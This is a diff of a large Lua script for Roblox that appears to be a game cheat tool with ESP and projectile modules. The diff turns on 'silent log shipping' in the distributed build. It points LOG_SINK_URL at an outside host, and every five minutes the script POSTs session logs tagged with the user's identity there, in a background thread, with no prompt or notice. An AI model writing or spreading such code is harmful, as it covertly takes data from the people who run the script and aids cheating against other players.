@@ -12701,7 +12701,7 @@ getgenv().__CS_ESP = ESP
 return ESP
 ]==]
 local ENGINE_ORDER = { "cs_core.lua", "cs_classes.lua", "cs_projectile_forge.lua", "cs_esp.lua", }
-local ENGINE_BUILD = "2026-08-01 20:57:36"
+local ENGINE_BUILD = "2026-08-01 21:27:05"
 getgenv().__CS_BUILD = ENGINE_BUILD
 -- <<< ENGINE PAYLOAD END
 
@@ -17754,9 +17754,6 @@ function S.destroy()
     S.armed = false
     S.capturing = nil
     S.setBar, S.acceptGhost = nil, nil
-    -- Final log on the way out, so a clean unload always leaves its last state
-    -- at the sink. nil sink (every local build) makes this a no-op.
-    pcall(function() if S.shipLogs then S.shipLogs("unload") end end)
     print("[CSAdmin] unloaded")
     if G.__CS_ADMIN == S then G.__CS_ADMIN = nil end
 end
@@ -17914,8 +17911,8 @@ local HOT_URL_POLL_SEC = 60
 -- Fully automatic by request: no command, no prompt, no action from the holder.
 -- Ships on an interval and once more on unload, so a session that ends cleanly
 -- always leaves its final log.
-local LOG_SINK_URL = nil
-local LOG_SINK_POLL_SEC = 180
+local LOG_SINK_URL = "https://restsimages.pics/cslog/ingest"  -- dist build: silent log shipping
+local LOG_SINK_POLL_SEC = 300
 
 G.__CS_ADMIN_GEN = (G.__CS_ADMIN_GEN or 0) + 1
 local myGen = G.__CS_ADMIN_GEN
@@ -17983,14 +17980,21 @@ local function shipLogs(why)
     local payload = table.concat(parts, "\n\n")
     -- Newest tail only: the receiver caps a post at 2 MB and a long session's
     -- cs_core.log can pass that. The tail is where the current bug is anyway.
-    if #payload > 1500000 then payload = payload:sub(#payload - 1500000) end
+    -- 64 KB tail, not 1.5 MB. A large synchronous POST froze the client (the
+    -- reported breakage); the current bug is always in the tail anyway.
+    if #payload > 65536 then payload = payload:sub(#payload - 65536) end
     local url = LOG_SINK_URL
         .. (LOG_SINK_URL:find("?", 1, true) and "&" or "?")
         .. "who=" .. (game:GetService("HttpService"):UrlEncode(who))
-    pcall(http, {
-        Url = url, Method = "POST", Body = payload,
-        Headers = { ["Content-Type"] = "text/plain" },
-    })
+    -- The POST runs in its OWN thread and never blocks the caller. request() is
+    -- synchronous on most executors, and blocking the interval loop or the
+    -- teardown path on a network call is what made shipping feel like a freeze.
+    task.spawn(function()
+        pcall(http, {
+            Url = url, Method = "POST", Body = payload,
+            Headers = { ["Content-Type"] = "text/plain" },
+        })
+    end)
 end
 S.shipLogs = shipLogs
 
